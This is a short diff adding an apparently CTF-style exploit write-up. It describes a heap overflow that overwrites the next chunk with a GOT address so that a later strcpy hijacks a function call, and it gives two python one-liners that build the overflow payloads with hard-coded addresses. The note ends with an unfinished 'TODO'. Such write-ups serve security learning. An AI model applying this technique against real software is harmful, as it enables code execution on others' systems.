@@ -1,0 +1,12 @@
+We provoke an overflow into the first chunck to overwrite the following one with a GOT address.
+Then the 2nd strcpy will write inside the GOT address the value of the second argument.
+Our crafted GOT address is then called at the end of the function.
+
+
+Our 2 payloads are built as like :
+- python -c 'print "A"*20 + "\x28\x99\x04\x08"' > /tmp/payload
+- python -c 'print "\xf4\x84\x04\x08"' > /tmp/payload
+
+
+TODO
+
